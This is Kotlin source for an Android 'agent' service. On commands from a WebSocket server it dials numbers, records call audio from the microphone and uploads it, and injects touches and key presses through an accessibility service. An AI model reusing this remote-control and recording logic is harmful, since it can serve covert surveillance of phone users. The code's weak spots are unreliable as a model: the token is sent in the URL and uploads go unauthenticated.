package io.pitayacode.agent.features.commands.data

import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.net.Uri
import android.os.Environment
import android.util.Log
import com.google.gson.Gson
import dagger.hilt.android.qualifiers.ApplicationContext
import io.pitayacode.agent.core.network.NetworkModule
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.nio.file.Files
import java.util.Base64
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

@Singleton
class CommandService @Inject constructor(
    @ApplicationContext private val context: Context,
    private val okHttpClient: OkHttpClient,
    private val gson: Gson
) {

    private var webSocket: WebSocket? = null
    private val _isConnected = MutableStateFlow(false)
    
    // Grabación de llamadas
    private var mediaRecorder: MediaRecorder? = null
    private var currentRecordingFile: File? = null
    private var currentInteractionId: String? = null
    val isConnected: StateFlow<Boolean> = _isConnected.asStateFlow()

    // Listener for WebRTC Signaling
    private var signalingListener: SignalingListener? = null

    interface SignalingListener {
        fun onOfferReceived(sdp: SessionDescriptionPayload)
        fun onAnswerReceived(sdp: SessionDescriptionPayload)
        fun onIceCandidateReceived(candidate: IceCandidatePayload)
    }

    fun setSignalingListener(listener: SignalingListener) {
        this.signalingListener = listener
    }

    private var reconnectUrl: String = ""
    private var reconnectToken: String = ""
    private var reconnectDelay: Long = 3000L
    private val maxReconnectDelay: Long = 30000L
    private var reconnectJob: kotlinx.coroutines.Job? = null
    private val serviceScope = kotlinx.coroutines.CoroutineScope(
        kotlinx.coroutines.SupervisorJob() + kotlinx.coroutines.Dispatchers.IO
    )

    fun connect(url: String, token: String) {
        reconnectUrl = url
        reconnectToken = token
        reconnectDelay = 3000L
        doConnect(url, token)
    }

    private fun doConnect(url: String, token: String) {
        // Don't connect if already open
        if (_isConnected.value) return

        Log.i("CommandService", "Connecting to $url")
        val wsUrl = if (url.contains("?")) "$url&token=$token" else "$url?token=$token"
        val request = Request.Builder()
            .url(wsUrl)
            .addHeader("Authorization", "Bearer $token")
            .build()

        webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i("CommandService", "WebSocket Connected")
                _isConnected.value = true
                reconnectDelay = 3000L // Reset on success

                try {
                    val androidId = android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID)
                    val registerMessage = JSONObject().apply {
                        put("type", "REGISTER")
                        put("deviceId", androidId)
                    }
                    webSocket.send(registerMessage.toString())
                    Log.i("CommandService", "Sent REGISTER with deviceId: $androidId")
                } catch (e: Exception) {
                    Log.e("CommandService", "Failed to send REGISTER message", e)
                }
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("CommandService", "Received: $text")
                try {
                    val message = gson.fromJson(text, WebSocketMessage::class.java)
                    when (message.type) {
                        "COMMAND" -> {
                            if (message.command != null) {
                                // TODO: Process Command via CommandHandler
                                sendAck(message.commandId ?: "", "RECEIVED", true, "OK")
                            }
                        }
                        "DIAL" -> {
                            val phoneNumber = message.phoneNumber
                            if (phoneNumber != null) {
                                Log.i("CommandService", "Recibido comando DIAL para: $phoneNumber")
                                try {
                                    val intent = Intent(Intent.ACTION_CALL).apply {
                                        data = Uri.parse("tel:$phoneNumber")
                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                    }
                                    context.startActivity(intent)
                                    sendAck(message.commandId ?: "", "DIALED", true, "OK")
                                    
                                    // Start Recording
                                    if (message.interactionId != null) {
                                        startRecording(message.interactionId)
                                    }
                                } catch (e: SecurityException) {
                                    Log.e("CommandService", "Sin permiso CALL_PHONE. Intentando con ACTION_DIAL...", e)
                                    try {
                                        val intent = Intent(Intent.ACTION_DIAL).apply {
                                            data = Uri.parse("tel:$phoneNumber")
                                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                        }
                                        context.startActivity(intent)
                                        sendAck(message.commandId ?: "", "DIAL_SCREEN_OPENED", true, "FALLBACK")
                                        
                                        // Start Recording on fallback as well
                                        if (message.interactionId != null) {
                                            startRecording(message.interactionId)
                                        }
                                    } catch (e2: Exception) {
                                        Log.e("CommandService", "Fallo incluso con ACTION_DIAL", e2)
                                        sendAck(message.commandId ?: "", "FAILED", false, e2.message ?: "Unknown error")
                                    }
                                } catch (e: Exception) {
                                    Log.e("CommandService", "Error ejecutando comando DIAL", e)
                                    sendAck(message.commandId ?: "", "FAILED", false, e.message ?: "Unknown error")
                                }
                            } else {
                                Log.e("CommandService", "Comando DIAL recibido pero phoneNumber es nulo")
                            }
                        }
                        "STOP_RECORDING" -> {
                            val interactionId = message.interactionId
                            if (interactionId != null && interactionId == currentInteractionId) {
                                stopRecordingAndUpload()
                                sendAck(message.commandId ?: "", "RECORDING_STOPPED", true, "OK")
                            } else {
                                Log.w("CommandService", "STOP_RECORDING ignorado: interactionId no coincide o es nulo")
                            }
                        }
                        "OFFER" -> {
                            message.sdp?.let { signalingListener?.onOfferReceived(it) }
                        }
                        "ANSWER" -> {
                            message.sdp?.let { signalingListener?.onAnswerReceived(it) }
                        }
                        "CANDIDATE" -> {
                            message.iceCandidate?.let { signalingListener?.onIceCandidateReceived(it) }
                        }
                        "INPUT" -> {
                            message.input?.let { input ->
                                Log.d("CommandService", "Received INPUT: type=${input.type}, action=${input.action}, x=${input.x}, y=${input.y}")
                                when (input.type) {
                                    "TOUCH" -> {
                                        val service = io.pitayacode.agent.features.input.RemoteControlService.instance
                                        if (service == null) {
                                            Log.e("CommandService", "RemoteControlService.instance is NULL! Accessibility service might be disabled in system settings.")
                                            return@let
                                        }
                                        if (input.x != null && input.y != null) {
                                            val metrics = service.resources?.displayMetrics
                                            if (metrics != null) {
                                                val realX = input.x * metrics.widthPixels
                                                val realY = input.y * metrics.heightPixels
                                                Log.d("CommandService", "Injecting TOUCH gesture: x=$realX, y=$realY, action=${input.action}")
                                                service.injectTouch(realX, realY, input.action)
                                            } else {
                                                Log.e("CommandService", "Display metrics are null!")
                                            }
                                        }
                                    }
                                    "KEY" -> {
                                        val service = io.pitayacode.agent.features.input.RemoteControlService.instance
                                        if (service == null) {
                                            Log.e("CommandService", "RemoteControlService.instance is NULL for KEY injection!")
                                            return@let
                                        }
                                        Log.d("CommandService", "Injecting KEY command: ${input.action}")
                                        service.injectKey(input.action)
                                    }
                                    else -> {
                                        Log.w("CommandService", "Unknown input type: ${input.type}")
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e("CommandService", "Error parsing message", e)
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.i("CommandService", "WebSocket Closing: $reason")
                _isConnected.value = false
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("CommandService", "WebSocket Failure: ${t.message}")
                _isConnected.value = false
                this@CommandService.webSocket = null
                // Auto-reconnect with exponential backoff
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.i("CommandService", "WebSocket Closed: $reason")
                _isConnected.value = false
                this@CommandService.webSocket = null
                if (code != 1000) { // 1000 = normal close (user called disconnect())
                    scheduleReconnect()
                }
            }
        })
    }

    private fun scheduleReconnect() {
        reconnectJob?.cancel()
        reconnectJob = serviceScope.launch {
            Log.i("CommandService", "Reconnecting in ${reconnectDelay}ms...")
            kotlinx.coroutines.delay(reconnectDelay)
            reconnectDelay = minOf(reconnectDelay * 2, maxReconnectDelay)
            doConnect(reconnectUrl, reconnectToken)
        }
    }

    fun sendMessage(message: WebSocketMessage) {
        val json = gson.toJson(message)
        webSocket?.send(json)
    }

    fun sendAck(commandId: String, status: String, success: Boolean, reasonCode: String) {
        val ack = WebSocketMessage(
            type = "ACK",
            commandId = commandId,
            status = status,
            outcome = CommandOutcome(success, reasonCode)
        )
        sendMessage(ack)
    }

    fun disconnect() {
        webSocket?.close(1000, "Disconnecting")
        webSocket = null
        _isConnected.value = false
    }

    private fun startRecording(interactionId: String) {
        try {
            currentInteractionId = interactionId
            val fileName = "rec_${interactionId}_${System.currentTimeMillis()}.mp4"
            currentRecordingFile = File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), fileName)

            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(currentRecordingFile?.absolutePath)
                prepare()
                start()
            }
            Log.i("CommandService", "Grabación iniciada: ${currentRecordingFile?.absolutePath}")
        } catch (e: IOException) {
            Log.e("CommandService", "Error al iniciar MediaRecorder", e)
        } catch (e: Exception) {
            Log.e("CommandService", "Error inesperado al iniciar grabación", e)
        }
    }

    private fun stopRecordingAndUpload() {
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            Log.i("CommandService", "Grabación detenida.")

            currentRecordingFile?.let { file ->
                if (file.exists()) {
                    uploadRecording(file, currentInteractionId!!)
                }
            }
            currentInteractionId = null
        } catch (e: Exception) {
            Log.e("CommandService", "Error al detener la grabación", e)
            mediaRecorder?.release()
            mediaRecorder = null
        }
    }

    private fun uploadRecording(file: File, interactionId: String) {
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            try {
                val bytes = Files.readAllBytes(file.toPath())
                val base64 = Base64.getEncoder().encodeToString(bytes)
                
                val jsonObject = JSONObject().apply {
                    put("interactionId", interactionId)
                    put("base64Audio", base64)
                    put("duration", 0) // TODO: Calculate actual duration if needed
                    put("fileSize", bytes.size)
                }

                val baseUrl = reconnectUrl.replace("ws://", "http://").replace("wss://", "https://").replace("/agent", "")
                val uploadUrl = "$baseUrl/agent/upload-recording"

                val requestBody = jsonObject.toString().toRequestBody("application/json".toMediaType())
                
                val request = Request.Builder()
                    .url(uploadUrl)
                    .post(requestBody)
                    .build()

                val response = okHttpClient.newCall(request).execute()
                if (response.isSuccessful) {
                    Log.i("CommandService", "Grabación subida exitosamente.")
                    file.delete() // Clean up after successful upload
                } else {
                    Log.e("CommandService", "Error al subir grabación: ${response.code} ${response.message}")
                }
            } catch (e: Exception) {
                Log.e("CommandService", "Error subiendo archivo", e)
            }
        }
    }
}
